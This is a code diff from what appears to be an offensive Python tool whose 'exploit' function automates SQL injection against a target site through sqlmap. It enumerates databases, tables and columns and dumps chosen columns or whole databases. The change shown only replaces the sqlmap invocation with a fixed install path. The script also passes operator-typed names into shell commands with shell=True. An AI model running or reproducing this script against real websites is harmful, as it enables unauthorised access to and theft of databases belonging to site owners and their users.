@@ -69,25 +69,26 @@ async def scanning(site):
 
 async def exploit(site):
     site = check_site(site)
+    sqlmap_path = "sqlmap/sqlmapproject-sqlmap-1.8.6-15-g79aa315/sqlmap.py"
     for pg in page:
         for ids in num_id:
-            sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} --dbs --batch"
+            sqlmap_cmd = f"python {sqlmap_path} -u {site}/{pg}{ids} --dbs --batch"
             subprocess.run(sqlmap_cmd, shell=True)
             db = input("\033[90m╔═══[Enter Database Name ]\n╚══>>>   \033[32m")
-            sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} --tables"
+            sqlmap_cmd = f"python {sqlmap_path} -u {site}/{pg}{ids} -D {db} --tables"
             subprocess.run(sqlmap_cmd, shell=True)
             table = input("\033[90m╔═══[Enter Table Name ]\n╚══>>>   \033[32m")
-            sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} -T {table} --columns"
+            sqlmap_cmd = f"python {sqlmap_path} -u {site}/{pg}{ids} -D {db} -T {table} --columns"
             subprocess.run(sqlmap_cmd, shell=True)
             dn = input("\033[1;31mDo you want to load the table or slot to load the table, type [d]: ")
             if dn.lower() == "d":
                 col = input("\033[1;31m[+] Write to me the name of the column you want to download: ")
-                sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} -T {table} -C {col} --dump"
+                sqlmap_cmd = f"python {sqlmap_path} -u {site}/{pg}{ids} -D {db} -T {table} -C {col} --dump"
                 subprocess.run(sqlmap_cmd, shell=True)
             else:
                 d_all = input("\033[1;31mDo you want to download the entire database [y/n]: ")
                 if d_all.lower() == "y":
-                    sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} --dump"
+                    sqlmap_cmd = f"python {sqlmap_path} -u {site}/{pg}{ids} -D {db} --dump"
                     subprocess.run(sqlmap_cmd, shell=True)
 
 def main():
